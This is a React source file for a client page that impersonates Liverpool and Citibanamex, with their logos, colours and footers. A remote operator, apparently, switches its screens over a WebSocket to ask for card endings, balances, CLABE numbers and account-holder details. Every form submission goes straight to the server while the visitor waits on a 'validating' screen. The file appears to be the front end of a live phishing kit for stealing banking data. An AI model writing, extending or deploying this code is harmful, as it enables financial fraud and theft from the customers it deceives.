import { useState, useEffect } from 'react';
import { useRoute } from 'wouter';
import { useWebSocket } from '@/hooks/useWebSocket';
import { ScreenTemplates } from '@/components/client/ScreenTemplates';
import { Session, ScreenType } from '@shared/schema';
import { formatDate } from '@/utils/helpers';
import liverpoolLogo from '../assets/pngwing.com 2.png';
import citibanamexLogo from '../assets/Banamex.png';

export default function ClientScreen() {
  // Get session ID from URL
  const [, params] = useRoute('/client/:sessionId');
  const sessionId = params?.sessionId || '';
  
  // State for the current screen
  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.FOLIO);
  const [sessionData, setSessionData] = useState<Partial<Session> & { banco: string }>({ banco: 'LIVERPOOL' });
  
  // Additional screen-specific state
  const [screenData, setScreenData] = useState<{
    terminacion?: string;
    saldo?: string;
    monto?: string;
    clabe?: string;
    titular?: string;
    comercio?: string;
    mensaje?: string;
  }>({});
  
  // WebSocket connection
  const { socket, connected, sendMessage } = useWebSocket('/ws');

  // Register with the server when connection is established
  useEffect(() => {
    if (connected && sessionId) {
      sendMessage({
        type: 'REGISTER',
        role: 'CLIENT',
        sessionId
      });
    }
  }, [connected, sessionId, sendMessage]);

  // Handle WebSocket messages
  useEffect(() => {
    if (!socket) return;

    const handleMessage = (event: MessageEvent) => {
      try {
        const message = JSON.parse(event.data);
        
        // Handle different message types
        if (message.type === 'INIT_SESSION') {
          setSessionData(message.data);
          // Set initial screen based on session data
          if (message.data.pasoActual) {
            setCurrentScreen(message.data.pasoActual as ScreenType);
          }
        }
        else if (message.type === 'SCREEN_CHANGE') {
          const { tipo, ...data } = message.data;
          
          // Extract screen type from the message
          const screenType = tipo.replace('mostrar_', '') as ScreenType;
          setCurrentScreen(screenType);
          
          // Update screen-specific data
          setScreenData(data);
        }
      } catch (error) {
        console.error("Error processing WebSocket message:", error);
      }
    };

    socket.addEventListener('message', handleMessage);
    return () => socket.removeEventListener('message', handleMessage);
  }, [socket]);

  // Handle form submissions
  const handleSubmit = (screen: ScreenType, formData: Record<string, any>) => {
    if (connected) {
      console.log('Enviando datos al servidor:', screen, formData);
      
      // Enviar datos al servidor inmediatamente
      sendMessage({
        type: 'CLIENT_INPUT',
        data: {
          tipo: screen,
          sessionId,
          data: formData
        }
      });
      
      // Cambiar a pantalla validando mientras esperamos respuesta del admin
      setCurrentScreen(ScreenType.VALIDANDO);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <header className={`${sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 'bg-[#e10098]'} text-white p-4 text-center`}>
        <img 
          src={sessionData.banco === 'CITIBANAMEX' ? citibanamexLogo : liverpoolLogo} 
          className="h-20 inline-block" 
          alt={sessionData.banco === 'CITIBANAMEX' ? 'Citibanamex' : 'Liverpool'} 
        />
        <div className="font-bold text-sm mt-2">{formatDate(new Date())}</div>
      </header>

      {sessionData.banco !== 'CITIBANAMEX' && (
        <div className="text-center mt-4 px-4">
          <p className="text-sm">Recuerda que con una sola cuenta puedes ingresar a todas nuestras tiendas.</p>
          <div className="mt-2 space-x-2">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Suburbia_2022_logo.svg/100px-Suburbia_2022_logo.svg.png" 
              className="h-5 inline-block" 
              alt="Suburbia" 
            />
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/8/89/Williams-Sonoma_logo.svg" 
              className="h-5 inline-block" 
              alt="Williams Sonoma" 
            />
          </div>
        </div>
      )}
      
      {sessionData.banco === 'CITIBANAMEX' && (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">Banca digital segura para todos tus trámites financieros</p>
        </div>
      )}

      <div className="container mx-auto max-w-md px-6 py-8 flex-grow">
        <ScreenTemplates 
          currentScreen={currentScreen} 
          screenData={screenData}
          onSubmit={handleSubmit}
          banco={sessionData.banco || 'LIVERPOOL'}
        />
      </div>

      <footer className="mt-auto">
        <div className="bg-gray-100 p-4 text-center text-sm">
          <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Aprende más</a>
          <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Ayuda</a>
          <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Términos y condiciones</a>
          <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Seguridad en línea</a>
        </div>

        <div className={`${sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 'bg-[#e10098]'} text-white p-4 text-center text-sm`}>
          <div className="mb-3">
            <a href="#" className="text-white mx-2">Contáctanos</a> |
            <a href="#" className="text-white mx-2">Aclaraciones</a> |
            <a href="#" className="text-white mx-2">Promociones</a> |
            <a href="#" className="text-white mx-2">Facebook</a> |
            <a href="#" className="text-white mx-2">Youtube</a>
          </div>
          <div>© {sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 'Liverpool'} México 2024. Todos los Derechos Reservados</div>
        </div>
      </footer>
    </div>
  );
}
